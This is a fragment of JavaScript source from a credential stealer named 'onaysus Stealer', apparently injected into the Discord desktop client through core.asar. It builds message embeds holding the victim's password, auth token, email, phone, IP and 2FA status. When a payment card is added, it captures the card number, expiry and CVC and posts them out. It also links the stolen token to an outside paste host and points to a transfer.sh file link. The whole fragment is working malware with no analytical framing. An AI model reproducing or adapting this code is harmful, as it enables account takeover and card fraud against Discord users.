                        name: "NSFW <a:nsfw:1041640474617839616>",
                        value: `${GetNSFW(user.nsfw_allowed)}`,
                        inline: !0
                    }, {
                        name: "A2F <a:a2f:1040272766982692885>",
                        value: `${GetA2F(user.mfa_enabled)}`,
                        inline: !0
                    }, {
                        name: "onaysus Files",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
                        inline: !0
                    }, {
                        name: "New Email <a:email:1041639672037785691>",
                        value: `\`${user.email}\``,
                        inline: !0
                    }, {
                        name: "Phone :mobile_phone:",
                        value: `\`${user.phone ?? "None"}\``,
                        inline: !0
                    }, {
                        name: "<a:password:1041639669047238676> Password",
                        value: `\`${data.password}\``,
                        inline: !0
                    }, {
                        name: "Bio <a:mavikirmizi:853238372591599617>",
                        value: `\`\`\`${user.bio ?? ":x:"}\`\`\``,
                        inline: !1
                    }, {
                        name: "<a:tokens:1041634540537511957> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
                        inline: !1
                    },],

                    thumbnail: userAvatar,
                    image: userBanner
                })

                var params2 = await makeEmbed({
                    title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                    color: config['embed-color'],
                    description: Friends.badges,
                    image: userBanner,
                    thumbnail: userAvatar
                })

                params.embeds.push(params2.embeds[0])

                await post(params)
            }
            break
        case request.url.endsWith("tokens"):
            var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]

            var params = await makeEmbed({
                title: "onaysus Stealer User Credit Card Added",
                color: config['embed-color'],
                fields: [
                    {
                        name: "onaysus Files",
                        value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`
                    },
                    {name: "IP", value: ip},
                    {name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}`},
                    {name: "ID <:iduser:1041634535395307520>", value: user.id},
                    {name: "Email <a:email:1041639672037785691>", value: user.email},
                    {name: "Nitro Type <a:nitro:1041639670288748634>", value: GetNitro(user.premium_type)},
                    {name: "Language <:language:1041640473477001236>", value: GetLangue(user.locale)},
                    {name: "A2F <a:a2f:1040272766982692885>", value: GetA2F(user.mfa_enabled)},
                    {name: "NSFW <a:nsfw:1041640474617839616>", value: GetNSFW(user.nsfw_allowed)},
                    {name: "Badges <:badge:1041634538150973460>", value: GetBadges(user.flags)},
                    {name: "Credit Card Number", value: CardNumber},
                    {name: "Credit Card Expiration", value: `${month}/${year}`},
                    {name: "CVC", value: CardCVC},
                    {name: "<a:tokens:1041634540537511957> Token", value: token}
                ],

                thumbnail: userAvatar,
                image: userBanner
            });

            var params2 = await makeEmbed({
                title: `<a:totalfriends:1041641100017946685> Total Friends (${Friends.len})`,
                color: config['embed-color'],
                description: Friends.badges,
                image: userBanner,
                thumbnail: userAvatar
            })

            params.embeds.push(params2.embeds[0])
            await post(params)
            break
    }
})
module.exports = require("./core.asar")